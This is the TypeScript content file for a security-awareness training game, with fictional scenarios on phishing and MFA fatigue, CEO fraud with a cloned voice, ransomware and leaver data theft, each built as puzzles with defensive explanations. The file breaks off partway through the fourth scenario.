/* Kavach Breach Room: game content.
   Every company, person and event here is fictional.
   Text fields may contain simple HTML (<b>, <br>, <span class=...>) and are rendered as authored content. */

export type Quality = 'best' | 'ok' | 'poor';
export type Tone = 'ok' | 'bad' | 'info';

export interface SpotItem { id: string; html: string; head?: string; flag?: boolean; note?: string }
export interface PickItem { id: string; text: string; bad?: boolean; why?: string }
export interface ChoiceOption { id: string; text: string; right?: boolean; why?: string }
export interface OrderStep { id: string; text: string }
export interface DecisionOption { id: string; text: string; q: Quality; pen?: number; note: string }

interface LockBase { name: string; task: string; hint: string; debrief: string }
export interface SpotLock extends LockBase { type: 'spot'; frame: 'mail' | 'chat' | 'code' | 'note'; items: SpotItem[]; chatName?: string; chatSub?: string; fileName?: string }
/** rows: table cells; an optional last cell of 'ok' | 'bad' | 'info' colours the final column. */
export interface CodeLock extends LockBase { type: 'code'; mask: string; answer: string; cols: string[]; rows: string[][]; pre?: string }
export interface PickLock extends LockBase { type: 'pick'; items: PickItem[] }
export interface ChoiceLock extends LockBase { type: 'choice'; options: ChoiceOption[] }
export interface OrderLock extends LockBase { type: 'order'; steps: OrderStep[]; shown: string[] }
export type Lock = SpotLock | CodeLock | PickLock | ChoiceLock | OrderLock;

export interface Decision { type: 'decision'; name: string; prompt: string; options: DecisionOption[] }
export interface Inject { id: string; name: string; prompt: string; options: DecisionOption[] }

export interface Scenario {
  id: string;
  track: 'core' | 'dev';
  title: string;
  company: string;
  threat: string;
  lede: string;
  /** Locks 1 to 6, played in order. The decision comes after lock 3. */
  locks: Lock[];
  decision: Decision;
  /** Extra lock a team must clear after a poor decision. */
  detour: Lock;
  lessons: string[];
}

export const SCENARIOS: Scenario[] = [
  {
    "id": "leak",
    "title": "The Friday Leak",
    "company": "NovaPay",
    "threat": "Phishing, MFA fatigue, data handling",
    "lede": "Friday, 6:40 PM. A file with 2,000 NovaPay customer records has turned up for sale online. Work out how it got out.",
    "locks": [
      {
        "type": "spot",
        "frame": "mail",
        "name": "The email",
        "task": "Riya from Settlement Ops got this email at 5:10 PM. Tap the 4 warning signs that should have stopped her.",
        "items": [
          {
            "id": "from",
            "head": "From",
            "html": "NovaPay IT Desk &lt;helpdesk@novapay-support.co&gt;",
            "flag": true,
            "note": "Lookalike sender. NovaPay mail comes from novapay.com, not novapay-support.co."
          },
          {
            "id": "to",
            "head": "To",
            "html": "Riya Mehta"
          },
          {
            "id": "subj",
            "head": "Subject",
            "html": "Mailbox migration tonight"
          },
          {
            "id": "greet",
            "html": "Hi Riya,"
          },
          {
            "id": "move",
            "html": "We are moving Settlement team mailboxes to a new storage server this evening."
          },
          {
            "id": "urgent",
            "html": "Your mailbox will be locked in 30 minutes unless you verify your account.",
            "flag": true,
            "note": "False urgency. A short deadline is there to stop you thinking."
          },
          {
            "id": "link",
            "html": "<span class=\"fake-btn\">Verify on novapay.com</span>",
            "flag": true,
            "note": "The button really goes to novapay-verify.top/login. Check where a link leads before you sign in."
          },
          {
            "id": "creds",
            "html": "On the next page, enter your password and the code that appears on your phone.",
            "flag": true,
            "note": "IT never asks for your password or a sign-in code. Nobody genuine does."
          },
          {
            "id": "sign",
            "html": "Thanks,<br>IT Service Desk, Floor 3, ext. 4410"
          }
        ],
        "hint": "Two of the warning signs are in the sender line and the button. The other two are in what the email says and what it asks for.",
        "debrief": "Riya clicked at 5:12 PM and typed her password into the fake page. But every NovaPay sign-in also needs an approval on her phone. So how did the attacker get past that?"
      },
      {
        "type": "code",
        "name": "The sign-in log",
        "mask": "##:##",
        "answer": "1719",
        "task": "The attacker now had Riya’s password. Here’s her sign-in log for Friday. Enter the time the attacker got in.",
        "cols": [
          "Time",
          "Where and device",
          "Result"
        ],
        "rows": [
          [
            "09:02",
            "Mumbai<br><span class=\"sub\">Riya’s laptop</span>",
            "Signed in",
            "ok"
          ],
          [
            "13:47",
            "Mumbai<br><span class=\"sub\">Riya’s phone</span>",
            "Signed in",
            "ok"
          ],
          [
            "17:13",
            "Amsterdam (VPN)<br><span class=\"sub\">New Windows PC</span>",
            "Approval denied",
            "bad"
          ],
          [
            "17:14–17:18",
            "Amsterdam (VPN)<br><span class=\"sub\">New Windows PC</span>",
            "11 more approvals denied",
            "bad"
          ],
          [
            "17:19",
            "Amsterdam (VPN)<br><span class=\"sub\">New Windows PC</span>",
            "Signed in",
            "ok"
          ],
          [
            "17:21",
            "Mumbai<br><span class=\"sub\">Riya’s phone</span>",
            "Signed in",
            "ok"
          ],
          [
            "17:26",
            "Amsterdam (VPN)<br><span class=\"sub\">New Windows PC</span>",
            "Searched mailbox for “settlement”",
            "info"
          ]
        ],
        "hint": "Riya’s phone kept buzzing with approval requests. Find the moment one finally went through for the stranger’s device.",
        "debrief": "Thirteen approval requests buzzed while Riya was leaving, and she tapped Approve to make them stop. This is MFA fatigue. An approval you didn’t ask for is an attack in progress: deny it and report it. But the leaked file was never in Riya’s mailbox. So where did it come from?"
      },
      {
        "type": "pick",
        "name": "The data trail",
        "task": "Here’s what Riya did with customer data this week. Pick the 3 habits that put it outside NovaPay’s control.",
        "items": [
          {
            "id": "link",
            "text": "Shared the full settlement file with a vendor using “Anyone with the link”.",
            "bad": true
          },
          {
            "id": "lock",
            "text": "Locked her screen before stepping away for lunch."
          },
          {
            "id": "ai",
            "text": "Pasted 40 customer rows into a free AI chatbot to summarise mismatches.",
            "bad": true
          },
          {
            "id": "folder",
            "text": "Saved the working file in the team’s restricted Settlement folder."
          },
          {
            "id": "gmail",
            "text": "Forwarded the file to her personal Gmail to finish it at home.",
            "bad": true
          },
          {
            "id": "ask",
            "text": "Checked with IT before installing a PDF converter."
          }
        ],
        "hint": "For each habit, ask: who else could see the data now?",
        "debrief": "The attacker searched Riya’s sent mail, found the “Anyone with the link” share, and downloaded all 2,000 rows. The chatbot and personal Gmail weren’t used this time, but they were open doors too."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The listing",
        "task": "The seller posted a free sample to prove the file is real. Tap the 4 details that make this personal data.",
        "items": [
          {
            "id": "title",
            "html": "<b>SELLING:</b> NovaPay settlement data, 2,000 rows, fresh this week"
          },
          {
            "id": "price",
            "html": "Price 0.4 BTC. Escrow accepted."
          },
          {
            "id": "name",
            "html": "<b>Name:</b> Anil K. Sharma",
            "flag": true,
            "note": "A name points to one real person."
          },
          {
            "id": "mob",
            "html": "<b>Mobile:</b> 98201 47736",
            "flag": true,
            "note": "A mobile number leads straight to one person."
          },
          {
            "id": "upi",
            "html": "<b>UPI ID:</b> anil.sharma@upi",
            "flag": true,
            "note": "A UPI ID is tied to a real person and their bank account."
          },
          {
            "id": "acct",
            "html": "<b>Account:</b> 50100234174417, IFSC KVRB0001234",
            "flag": true,
            "note": "Bank account details are personal and financial data."
          },
          {
            "id": "batch",
            "html": "<b>Batch:</b> NP-STL-0915-07"
          },
          {
            "id": "win",
            "html": "<b>Settlement window:</b> 15 Sep, 18:00 to 20:00"
          }
        ],
        "hint": "For each line, ask: could this lead someone to one real person?",
        "debrief": "Names, mobile numbers, UPI IDs and account numbers identify real people, so this is a personal data breach with legal reporting duties for NovaPay and its bank clients. And never buy or download a leaked file to check it: send the link to Security."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "It’s 6:52 PM and you know what happened. Tap the steps in the order your team should do them.",
        "steps": [
          {
            "id": "report",
            "text": "Report it to the security team now, even though it’s Friday evening."
          },
          {
            "id": "cutoff",
            "text": "Cut the attacker off: reset Riya’s password, sign out all her sessions, switch off the public link."
          },
          {
            "id": "investigate",
            "text": "Check the logs for anything else the attacker opened or downloaded."
          },
          {
            "id": "inform",
            "text": "Inform the affected clients through the agreed escalation route."
          }
        ],
        "shown": [
          "cutoff",
          "inform",
          "report",
          "investigate"
        ],
        "hint": "Nothing can start until the right people know. And you can’t judge the damage while the attacker still has access.",
        "debrief": "Fast reporting turns a breach into a contained incident. Report early, even when you’re unsure: a false alarm costs minutes, a late one costs clients."
      },
      {
        "type": "choice",
        "name": "The safe share",
        "task": "Monday. The vendor still needs the settlement file every week. What’s the safe way to share it?",
        "options": [
          {
            "id": "free",
            "text": "Upload it to a free file-sharing site and send the link on WhatsApp.",
            "why": "Free sites and chat apps put the file outside NovaPay’s control, with no record of who opened it."
          },
          {
            "id": "tool",
            "text": "Share it from the approved file-sharing tool with the vendor’s named accounts, an expiry date and download logging.",
            "right": true,
            "why": "Named access, an expiry date and logs keep the data in NovaPay’s control."
          },
          {
            "id": "link",
            "text": "Keep using “Anyone with the link”, but delete the link after a day.",
            "why": "For that whole day, anyone who gets the link can download 2,000 customers’ data."
          },
          {
            "id": "zip",
            "text": "Email it as a password-protected zip, with the password in the same email.",
            "why": "Anyone who gets the email gets the password too."
          }
        ],
        "hint": "The safe option lets NovaPay decide exactly who can open the file, for how long, and see who did.",
        "debrief": "Approved tools with named access, an expiry date and logging keep customer data in NovaPay’s control. If something goes wrong, the logs show exactly who opened what."
      }
    ],
    "lessons": [
      "Check the sender and where a link really goes before you sign in anywhere.",
      "An approval request you didn’t start is an attack. Deny it and report it.",
      "Customer data stays in approved places: no public links, personal email or free AI tools.",
      "Report early, even when you’re unsure.",
      "Names, mobile numbers, UPI IDs and account numbers are personal data. Never buy or download a leaked file.",
      "Share data only through approved tools, with named access and an expiry date."
    ],
    "decision": {
      "type": "decision",
      "name": "The first call",
      "prompt": "It’s 6:45 PM on Friday. You’ve just realised Riya’s account was taken over. What do you do first?",
      "options": [
        {
          "id": "call",
          "text": "Call the security team’s incident number right away.",
          "q": "best",
          "note": "Right call. A live account takeover needs people working on it now, not on Monday."
        },
        {
          "id": "mail",
          "text": "Email the security mailbox and keep digging yourself.",
          "q": "ok",
          "pen": 60,
          "note": "An email may sit unread all weekend. For a live incident, call. +60 seconds."
        },
        {
          "id": "wait",
          "text": "Wait until Monday. It might be a false alarm.",
          "q": "poor",
          "note": "The attacker had the whole weekend. Now you have to clean up the damage."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Weekend damage",
      "task": "Monday, 9 AM. The attacker had Riya’s mailbox all weekend. Pick the 2 signs that show what they did.",
      "items": [
        {
          "id": "fwd",
          "text": "A new rule forwarding every email to an outside Gmail address",
          "bad": true,
          "why": "Forwarding rules let attackers keep reading mail even after a password reset."
        },
        {
          "id": "ooo",
          "text": "Riya’s out-of-office reply, which she set herself on Friday"
        },
        {
          "id": "sent",
          "text": "Payment-change emails in Sent Items that Riya never wrote",
          "bad": true,
          "why": "Attackers use a trusted mailbox to trick clients and vendors."
        },
        {
          "id": "cal",
          "text": "A team meeting invite from her manager"
        }
      ],
      "hint": "Look for things Riya didn’t do herself.",
      "debrief": "Both are now removed and the clients warned. Waiting cost a weekend of exposure."
    },
    "track": "core"
  },
  {
    "id": "bec",
    "title": "The Urgent Transfer",
    "company": "Zentra Finserv",
    "threat": "CEO fraud, deepfake voice, payment diversion",
    "lede": "Monday, 1:15 PM. ₹48 lakh meant for a logistics vendor has landed in a fraudster’s account. The “CFO” who asked for it never sent a single message.",
    "locks": [
      {
        "type": "spot",
        "frame": "chat",
        "name": "The message",
        "chatName": "Arjun Rao (CFO)",
        "chatSub": "+91 98xxx x1207 · not in your contacts",
        "task": "Neha in Treasury got these WhatsApp messages at 11:02 AM. Tap the 4 warning signs.",
        "items": [
          {
            "id": "num",
            "html": "Hi Neha, Arjun here. This is my new number, my old phone died.",
            "flag": true,
            "note": "A “new number” from a senior person is the classic opener. Verify on the number you already have."
          },
          {
            "id": "q",
            "html": "Hope the quarter close is going okay."
          },
          {
            "id": "secret",
            "html": "We’re closing a confidential acquisition. Please don’t discuss this with anyone, including your manager.",
            "flag": true,
            "note": "Secrecy. Being told not to check with anyone is how fraudsters stop you checking."
          },
          {
            "id": "amt",
            "html": "Need ₹48,00,000 sent to Brightline Logistics today as an advance."
          },
          {
            "id": "bank",
            "html": "Their bank has changed. Use the new account in the attached image, not the one on file.",
            "flag": true,
            "note": "Changed bank details. Any change to where money goes must be confirmed on a known number."
          },
          {
            "id": "img",
            "html": "<span class=\"att\">IMG_2291.jpg · bank details</span>"
          },
          {
            "id": "rush",
            "html": "Must be done before 12. Skip the usual two approvals, I’ll sign the form later.",
            "flag": true,
            "note": "Urgency plus a request to skip controls. Approvals exist exactly for moments like this."
          },
          {
            "id": "thx",
            "html": "Thanks, you’re a star."
          }
        ],
        "hint": "Look for: who it claims to be, what you’re told not to do, where the money goes, and how fast it must happen.",
        "debrief": "Neha had doubts. Then her phone rang, and it was Arjun’s voice, calm and familiar, asking if the payment was done. What should she have done next?"
      },
      {
        "type": "choice",
        "name": "The voice call",
        "task": "The caller sounds exactly like Arjun. What is the one safe way to check it’s really him?",
        "options": [
          {
            "id": "q",
            "text": "Ask him a personal question on the same call.",
            "why": "Details about colleagues are easy to find online, and the caller controls the call."
          },
          {
            "id": "cb",
            "text": "Hang up and call him back on the number in the company directory.",
            "right": true
          },
          {
            "id": "sel",
            "text": "Ask him to send a selfie on WhatsApp.",
            "why": "Photos and video can be faked or stolen too."
          },
          {
            "id": "wa",
            "text": "Reply on WhatsApp: “Is this really you?”",
            "why": "That just asks the fraudster to confirm themselves."
          }
        ],
        "hint": "Every option except one keeps the conversation on a channel the fraudster controls.",
        "debrief": "Voices can now be cloned from a few seconds of a podcast or earnings call. The only reliable check is a channel you start yourself: hang up and call back on a number you already trust. Neha didn’t. Then a request arrived to change Brightline’s bank account."
      },
      {
        "type": "pick",
        "name": "The bank change",
        "task": "The “CFO” also forwarded a letter from Brightline: “Our bank account has changed, effective today.” Pick the 3 checks Treasury must do before changing a vendor’s bank details.",
        "items": [
          {
            "id": "call",
            "text": "Call Brightline back on the phone number already in the vendor master.",
            "bad": true,
            "why": "A call-back on a number you already hold is the one check a fraudster can’t fake."
          },
          {
            "id": "look",
            "text": "Check that the letterhead and signature look genuine.",
            "why": "Letterheads and signatures are easy to copy."
          },
          {
            "id": "maker",
            "text": "Get a second person to approve the change in the payments system.",
            "bad": true,
            "why": "One person can be fooled. Two independent checks are much harder to beat."
          },
          {
            "id": "reply",
            "text": "Reply to the email and ask them to confirm the new account.",
            "why": "If the email is fake, the fraudster simply replies “Confirmed”."
          },
          {
            "id": "penny",
            "text": "Confirm the new account holder’s name matches Brightline (a penny-drop check) before the first payment.",
            "bad": true,
            "why": "A name check shows when an account belongs to someone else."
          },
          {
            "id": "cfo",
            "text": "Accept it, because the CFO has already approved it.",
            "why": "Seniority isn’t verification. Fraudsters count on it."
          }
        ],
        "hint": "Anything the fraudster sent can be faked. Look for checks that use information they don’t control.",
        "debrief": "These checks exist for exactly this moment. Neha knew them, but the “CFO” was about to turn up the pressure."
      },
      {
        "type": "code",
        "name": "The money trail",
        "mask": "####",
        "answer": "8093",
        "task": "Treasury made 5 payments on Monday. Compare them with the vendor master and enter the last 4 digits of the account the fraudster controls.",
        "pre": "<p class=\"tcap\">Vendor master (approved accounts)</p><div class=\"log-wrap\"><table><thead><tr><th>Vendor</th><th>Bank account</th></tr></thead><tbody><tr><td>Brightline Logistics</td><td class=\"t\">•••• 4417</td></tr><tr><td>Sunrise Facility Services</td><td class=\"t\">•••• 2290</td></tr><tr><td>Kaveri Cloud Hosting</td><td class=\"t\">•••• 7731</td></tr><tr><td>Pinnacle Print Works</td><td class=\"t\">•••• 0518</td></tr><tr><td>Orion Payroll Bureau</td><td class=\"t\">•••• 6602</td></tr></tbody></table></div><p class=\"tcap\">Monday’s payments</p>",
        "cols": [
          "Time",
          "Paid to",
          "Account",
          "Amount"
        ],
        "rows": [
          [
            "10:05",
            "Sunrise Facility Services",
            "•••• 2290",
            "₹3,40,000"
          ],
          [
            "10:40",
            "Kaveri Cloud Hosting",
            "•••• 7731",
            "₹6,12,500"
          ],
          [
            "11:52",
            "Brightline Logistics",
            "•••• 8093",
            "₹48,00,000"
          ],
          [
            "12:30",
            "Pinnacle Print Works",
            "•••• 0518",
            "₹82,000"
          ],
          [
            "12:47",
            "Orion Payroll Bureau",
            "•••• 6602",
            "₹11,25,000"
          ]
        ],
        "hint": "The vendor name looks right on every line. Check the account numbers.",
        "debrief": "The name on the payment said Brightline, but the account was a mule account opened two weeks ago. Banks pay by account number, not by name. The money is moving. What now?"
      },
      {
        "type": "order",
        "name": "The response",
        "task": "It’s 1:15 PM. Put the response steps in order.",
        "steps": [
          {
            "id": "alarm",
            "text": "Raise the alarm now: tell the security team and call the bank to stop the transfer."
          },
          {
            "id": "evid",
            "text": "Save the evidence: screenshot the chat and keep the call log. Delete nothing."
          },
          {
            "id": "file",
            "text": "File a complaint on the 1930 helpline or cybercrime.gov.in with the transaction details."
          },
          {
            "id": "fix",
            "text": "Fix the gap: no change to bank details without a call-back on a known number."
          }
        ],
        "shown": [
          "fix",
          "file",
          "alarm",
          "evid"
        ],
        "hint": "Money moves fast between mule accounts, so the first call is about stopping it. A complaint needs proof.",
        "debrief": "The first hour after a fraudulent transfer is when a bank is most likely to freeze it. Speed and evidence get money back; a process fix stops it happening twice."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The overshare",
        "task": "A week later the investigation asks: how did the fraudsters know so much? Tap the 4 details in Arjun’s public LinkedIn post that helped them.",
        "items": [
          {
            "id": "hd",
            "html": "<b>Arjun Rao</b> · CFO, Zentra Finserv · Public post"
          },
          {
            "id": "vendor",
            "html": "Thrilled to announce our new logistics partner, Brightline Logistics!",
            "flag": true,
            "note": "Naming the vendor told fraudsters whose payments to divert."
          },
          {
            "id": "team",
            "html": "Huge thanks to the whole team for a strong quarter."
          },
          {
            "id": "neha",
            "html": "Special shout-out to Neha in Treasury, who makes sure every vendor gets paid on time.",
            "flag": true,
            "note": "Now they knew who releases payments, by name."
          },
          {
            "id": "pod",
            "html": "Catch my 40-minute podcast on life as a CFO (link in the comments).",
            "flag": true,
            "note": "Forty minutes of clear audio is plenty to clone a voice."
          },
          {
            "id": "trip",
            "html": "Off to Singapore all next week for a big deal. Mostly offline!",
            "flag": true,
            "note": "Travel and “offline” make a “new number, can’t talk” story believable."
          },
          {
            "id": "tags",
            "html": "#fintech #growth #leadership"
          }
        ],
        "hint": "Look for details that tell a stranger who pays whom, who to target, how Arjun sounds, and when he’s hard to reach.",
        "debrief": "Each detail was harmless on its own. Together they gave the fraudsters the vendor, the target, the voice and the excuse. Think before you post about vendors, colleagues, travel and recordings."
      }
    ],
    "lessons": [
      "A “new number” from a senior person is unverified until you call back on the number you know.",
      "Secrecy, urgency and skipping approvals together mean stop.",
      "A familiar voice is no longer proof. Hang up and call back.",
      "Fraudulent transfer? Alert the bank within the hour and report on 1930.",
      "A bank detail change needs a call-back on a known number and a second approver.",
      "Posts about vendors, colleagues and travel are a fraudster’s research."
    ],
    "decision": {
      "type": "decision",
      "name": "The pressure",
      "prompt": "Neha hesitates. The “CFO” calls again, angry: the deal collapses in 10 minutes if the money doesn’t go. What does she do?",
      "options": [
        {
          "id": "hold",
          "text": "Stick to process: no payment until she verifies on the directory number.",
          "q": "best",
          "note": "Pressure is the attack. Process protects her and the company."
        },
        {
          "id": "pair",
          "text": "Ask a colleague to approve it quickly so it isn’t just her decision.",
          "q": "ok",
          "pen": 60,
          "note": "Two people fooled is still fraud. Verification has to happen on a separate, trusted channel. +60 seconds."
        },
        {
          "id": "pay",
          "text": "Pay now and avoid getting into trouble.",
          "q": "poor",
          "note": "The money has gone. Now it’s a race to recover it."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "The recall",
      "task": "You call your bank’s fraud desk to try to recall the transfer. Pick the 3 details they need.",
      "items": [
        {
          "id": "utr",
          "text": "The transaction reference (UTR) of the payment",
          "bad": true
        },
        {
          "id": "otp",
          "text": "The OTP that just arrived on your phone",
          "why": "No genuine bank ever needs your OTP or password, even its fraud desk."
        },
        {
          "id": "amt",
          "text": "The amount, date and time of the transfer",
          "bad": true
        },
        {
          "id": "ben",
          "text": "The beneficiary account number and IFSC",
          "bad": true
        },
        {
          "id": "pwd",
          "text": "Your internet banking password",
          "why": "Never share it with anyone, including the bank."
        }
      ],
      "hint": "The bank needs facts about the payment, never your secrets.",
      "debrief": "The bank froze part of the money in the mule account. Speed is everything in a recall."
    },
    "track": "core"
  },
  {
    "id": "ransom",
    "title": "Ransomware Monday",
    "company": "Kestrel Pay",
    "threat": "Malicious attachments, ransomware, backups",
    "lede": "Monday, 9:05 AM. Every screen in Settlement shows the same red note: “Your files are encrypted. Pay 12 BTC in 72 hours.” Find out how it started and recover.",
    "locks": [
      {
        "type": "pick",
        "name": "The attachments",
        "task": "On Friday evening, these 6 attachments reached the Settlement team. Pick the 3 that could run code on a laptop.",
        "items": [
          {
            "id": "exe",
            "text": "<b>Invoice_Sept.pdf.exe</b> from accounts@kestre1pay.com",
            "bad": true,
            "why": "Double extension: it’s a program dressed as a PDF, from a lookalike domain (1 for l)."
          },
          {
            "id": "ppt",
            "text": "<b>Q3_Review.pptx</b> shared from Kestrel SharePoint by your manager"
          },
          {
            "id": "xlsm",
            "text": "<b>Payroll_Revision.xlsm</b>: “Click Enable Content to see the figures”",
            "bad": true,
            "why": ".xlsm files carry macros. “Enable Content” lets them run."
          },
          {
            "id": "jpg",
            "text": "<b>Team_Offsite.jpg</b> from a colleague on your floor"
          },
          {
            "id": "zip",
            "text": "<b>Courier_Delivery.zip</b> containing Label.js",
            "bad": true,
            "why": "A .js file inside a zip is a script that Windows can run."
          },
          {
            "id": "pdf",
            "text": "<b>Leave_Policy_2026.pdf</b> from hr@kestrelpay.com, matching the intranet copy"
          }
        ],
        "hint": "Look at the end of each file name, and read the sender domains letter by letter.",
        "debrief": "Two people opened Payroll_Revision.xlsm. One laptop blocked the macro. The other didn’t. Which laptop let the attacker in?"
      },
      {
        "type": "code",
        "name": "The timeline",
        "mask": "KP-####",
        "answer": "0417",
        "task": "Here’s the security tool’s timeline. Enter the asset number of the laptop where the attacker first got in.",
        "cols": [
          "When",
          "Machine",
          "Event"
        ],
        "rows": [
          [
            "Fri 18:02",
            "KP-0388",
            "Excel opened Payroll_Revision.xlsm. Macro blocked",
            "ok"
          ],
          [
            "Fri 18:42",
            "KP-0417",
            "Excel opened Payroll_Revision.xlsm, then launched PowerShell",
            "bad"
          ],
          [
            "Sat 03:10",
            "KP-0417",
            "New admin account “svc-backup2” created",
            "bad"
          ],
          [
            "Sun 23:55",
            "FS-SETTLE-01",
            "Remote login as svc-backup2",
            "bad"
          ],
          [
            "Mon 02:05",
            "FS-SETTLE-01",
            "Mass file encryption started",
            "bad"
          ],
          [
            "Mon 02:09",
            "KP-1187",
            "Mass file encryption started",
            "bad"
          ]
        ],
        "hint": "Encryption is the last step of the attack, not the first. Look for where it began days earlier.",
        "debrief": "The attacker got in on Friday at 6:42 PM and spent the weekend quietly creating an admin account before encrypting on Monday morning. Now: how do you get the files back?"
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The ransom note",
        "task": "The note on every screen offers one way out. Tap the 4 pressure tactics.",
        "items": [
          {
            "id": "hd",
            "html": "<b>YOUR FILES ARE ENCRYPTED</b>"
          },
          {
            "id": "enc",
            "html": "All Settlement files and databases are locked with military-grade encryption."
          },
          {
            "id": "dbl",
            "html": "Pay 12 BTC within 72 hours. After that, the price doubles.",
            "flag": true,
            "note": "A deadline and a rising price are there to rush you."
          },
          {
            "id": "leak",
            "html": "We have also copied 40 GB of customer data. Don’t pay, and we publish it.",
            "flag": true,
            "note": "Double extortion: a leak threat on top of the lock-out, to squeeze harder."
          },
          {
            "id": "police",
            "html": "Do NOT contact the police or your IT team, or your key will be destroyed.",
            "flag": true,
            "note": "Cutting you off from help is the oldest trick there is. Always tell Security."
          },
          {
            "id": "chat",
            "html": "Questions? Chat with our support team at the link below."
          },
          {
            "id": "disc",
            "html": "Pay within 24 hours and get 30% off.",
            "flag": true,
            "note": "A discount is a sales tactic. It doesn’t make paying safe."
          }
        ],
        "hint": "Look for lines that rush you, scare you, or try to stop you asking for help.",
        "debrief": "The note is built to rush and isolate you. Paying funds the next attack and doesn’t guarantee a working key. Never contact the attackers yourself: leave that to Security and law enforcement."
      },
      {
        "type": "choice",
        "name": "The recovery",
        "task": "Which is the safest way to get Settlement working again?",
        "options": [
          {
            "id": "share",
            "text": "Restore last night’s backup from the shared drive every server can reach.",
            "why": "Anything every server can reach, the attacker could reach too. It was encrypted at 02:05."
          },
          {
            "id": "sync",
            "text": "Roll back from the cloud sync folder.",
            "why": "Sync copies changes, including encrypted files, within seconds."
          },
          {
            "id": "off",
            "text": "Remove the attacker’s admin account, then restore from the offline backup taken on Saturday.",
            "right": true
          },
          {
            "id": "pay",
            "text": "Pay the ransom: they’ve promised a decryption key.",
            "why": "Payment funds crime, keys often fail, and paid victims are attacked again."
          }
        ],
        "hint": "You need a copy the attacker could not touch, and the attacker must be gone first.",
        "debrief": "Offline or immutable backups are the ones ransomware can’t reach. And because the attacker had been inside since Friday, the backdoor account had to go first, or they’d simply come back."
      },
      {
        "type": "pick",
        "name": "Who to tell",
        "task": "By 11 AM, Security confirms customer settlement data was touched. Pick the 3 that Kestrel Pay must inform.",
        "items": [
          {
            "id": "certin",
            "text": "CERT-In, within 6 hours of noticing the incident",
            "bad": true,
            "why": "Indian rules require incidents like ransomware to be reported to CERT-In within 6 hours."
          },
          {
            "id": "attk",
            "text": "The attackers, to ask for a test decryption",
            "why": "Contact with attackers is for law enforcement and specialists, never staff."
          },
          {
            "id": "banks",
            "text": "The bank clients whose settlement data was affected, as their contracts require",
            "bad": true,
            "why": "Bank clients have contractual timelines and need to protect their own customers."
          },
          {
            "id": "sms",
            "text": "Every customer by SMS, before Security knows what was taken",
            "why": "Notify with facts, through the agreed process. Guesswork causes panic."
          },
          {
            "id": "rbi",
            "text": "RBI, under its incident-reporting rules for payment companies",
            "bad": true,
            "why": "As a payments company, Kestrel Pay reports cyber incidents to its regulator."
          },
          {
            "id": "wa",
            "text": "The staff WhatsApp group, so everyone stays updated",
            "why": "That’s how incident details leak. Updates go through official channels."
          }
        ],
        "hint": "Think about who has a legal or contractual right to know quickly.",
        "debrief": "Reporting clocks start when you notice an incident, not when you finish investigating. That’s why the first call to Security matters so much."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "If your screen shows a ransom note, what happens and in what order?",
        "steps": [
          {
            "id": "iso",
            "text": "Disconnect the laptop from the network (unplug or turn off Wi-Fi). Don’t switch it off."
          },
          {
            "id": "rep",
            "text": "Report it to IT Security straight away, from another device."
          },
          {
            "id": "evict",
            "text": "Security removes the attacker: disables rogue accounts and resets passwords."
          },
          {
            "id": "rest",
            "text": "Restore systems from clean offline backups and watch for return visits."
          }
        ],
        "shown": [
          "rest",
          "rep",
          "evict",
          "iso"
        ],
        "hint": "Stop the spread first: every second connected means more encrypted files.",
        "debrief": "Disconnecting stops the spread, and leaving the machine on keeps evidence in memory. Then report, evict, and only then restore."
      }
    ],
    "lessons": [
      "Read the whole file name. .exe, .js and “Enable Content” are red flags.",
      "Attackers wait. Encryption is the end of the story, not the start.",
      "Offline backups save the day. Remove the attacker before restoring.",
      "Ransom note? Disconnect, don’t switch off, and report from another device.",
      "Ransom notes are built to rush and isolate you. Never contact the attackers.",
      "Reporting clocks, like CERT-In’s 6 hours, start when you notice an incident."
    ],
    "decision": {
      "type": "decision",
      "name": "The shutdown",
      "prompt": "It’s 9:20 AM and some laptops are still encrypting. A manager shouts: “Switch off every PC now!” What do you do?",
      "options": [
        {
          "id": "iso",
          "text": "Disconnect affected machines from the network, leave them on, and follow IT Security.",
          "q": "best",
          "note": "Spread stops, and the evidence in memory survives."
        },
        {
          "id": "off",
          "text": "Switch everything off immediately.",
          "q": "ok",
          "pen": 60,
          "note": "It stops the spread but wipes the evidence held in memory, which slows the investigation. +60 seconds."
        },
        {
          "id": "work",
          "text": "Keep working on the laptops that seem fine. It’s IT’s problem.",
          "q": "poor",
          "note": "Connected laptops kept spreading the infection."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Stop the spread",
      "task": "By 10 AM the shared drive is encrypted too. Pick the 2 actions that stop it spreading further.",
      "items": [
        {
          "id": "net",
          "text": "Disconnect laptops from shared drives and VPN",
          "bad": true
        },
        {
          "id": "av",
          "text": "Run an antivirus scan on your own laptop and carry on working",
          "why": "A scan doesn’t stop an attacker who already has admin access."
        },
        {
          "id": "acct",
          "text": "Disable the attacker’s admin account “svc-backup2”",
          "bad": true
        },
        {
          "id": "ren",
          "text": "Rename the encrypted files back to their old names",
          "why": "Renaming doesn’t decrypt anything."
        }
      ],
      "hint": "Cut the paths it travels on and the account it uses.",
      "debrief": "The spread stopped, but more data needs restoring than if you’d isolated earlier."
    },
    "track": "core"
  },
  {
    "id": "leaver",
    "title": "The Last Day",
    "company": "Lumen Pay",
    "threat": "Insider risk, leaver access, data loss",
    "lede": "Tuesday, 10:30 AM. A rival’s pitch to your biggest merchant quoted Lumen Pay’s exact pricing, line by line. A sales manager left the company last week.",
    "locks": [
      {
        "type": "pick",
        "name": "The access review",
        "task": "Vikram resigned on 1 September and left on 15 September. This was his access on 14 September. Pick the 3 that should have been removed or restricted the day he resigned.",
        "items": [
          {
            "id": "crm",
            "text": "Bulk export rights in the CRM for every merchant",
            "bad": true,
            "why": "Nobody serving notice needs to export the whole customer base."
          },
          {
            "id": "mail",
            "text": "Company email and calendar"
          },
          {
            "id": "usb",
            "text": "USB storage switched on for his laptop",
            "bad": true,
            "why": "Removable storage should be off by default, and certainly during notice."
          },
          {
            "id": "chat",
            "text": "Team chat"
          },
          {
            "id": "drop",
            "text": "Personal Dropbox and file-sharing sites allowed through the web filter",
            "bad": true,
            "why": "Personal cloud storage is the easiest exit for company data."
          },
          {
            "id": "hr",
            "text": "HR portal for exit formalities"
          }
        ],
        "hint": "Which permissions let a lot of data leave in one go?",
        "debrief": "All three were still open on his second-last day. DLP did see something that night. When did the pricing sheet leave?"
      },
      {
